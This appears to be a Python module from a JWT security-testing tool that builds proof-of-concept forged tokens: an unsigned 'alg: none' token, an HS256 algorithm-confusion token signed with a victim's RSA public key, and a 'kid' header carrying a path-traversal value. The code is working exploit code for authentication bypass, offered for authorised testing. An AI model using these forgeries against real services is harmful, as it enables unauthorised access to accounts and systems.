"""Proof-of-concept token forgery.

These functions exist to *demonstrate* a finding, not to attack anyone. Both
constructions are decades old and require nothing that is not already public:

* `alg: none` — a token with no signature at all;
* HS256 confusion — sign with the victim's public-key PEM, hoping the verifier
  selected HMAC because the attacker chose the algorithm.

Use them only against systems you own or are authorised to test.
"""

from __future__ import annotations

import json

from .jwk import Jwks, rsa_material, rsa_public_pem
from .jwt import encode_segment, sign_hs256


def alg_none_token(claims: dict, header_extra: dict | None = None) -> str:
    header = {"alg": "none", "typ": "JWT"}
    header.update(header_extra or {})
    return f"{encode_segment(header)}.{encode_segment(claims)}."


def first_rsa_pem(jwks: Jwks) -> tuple[str, str] | None:
    """Return (kid, pem) for the first RSA key in the set."""
    for key in jwks.rsa_keys():
        material = rsa_material(key.jwk)
        if material:
            return key.kid, rsa_public_pem(*material)
    return None


def hs256_confusion_token(jwks: Jwks, claims: dict,
                          kid: str | None = None) -> tuple[str, str] | None:
    """Forge a token signed with an RSA public key as an HMAC secret.

    When ``kid`` does not resolve to an RSA key, the first RSA key is used —
    a verifier that fell back to a different key would still be confused, and
    the point of the PoC is to demonstrate the algorithm mismatch.

    Returns (token, secret_pem), or None when the JWKS has no RSA key.
    """
    chosen_kid = ""
    pem_data = None
    candidates = [k for k in jwks.rsa_keys() if rsa_material(k.jwk)]
    preferred = [k for k in candidates if kid and k.kid == kid]
    for key in preferred + [k for k in candidates if k not in preferred]:
        material = rsa_material(key.jwk)
        if not material:
            continue
        chosen_kid = key.kid
        pem_data = rsa_public_pem(*material)
        break
    if pem_data is None:
        return None

    header = {"alg": "HS256", "typ": "JWT"}
    if chosen_kid:
        header["kid"] = chosen_kid
    signing_input = f"{encode_segment(header)}.{encode_segment(claims)}"
    token = f"{signing_input}.{sign_hs256(pem_data.encode(), signing_input)}"
    return token, pem_data


def kid_traversal_header(kid: str = "../../../../../../dev/null") -> str:
    """Header showing a `kid` that looks like a file path.

    Some old libraries passed `kid` straight into a file read. This is included
    as a static artifact for documentation, not as an exploit.
    """
    return json.dumps({"alg": "HS256", "typ": "JWT", "kid": kid},
                      separators=(",", ":"))
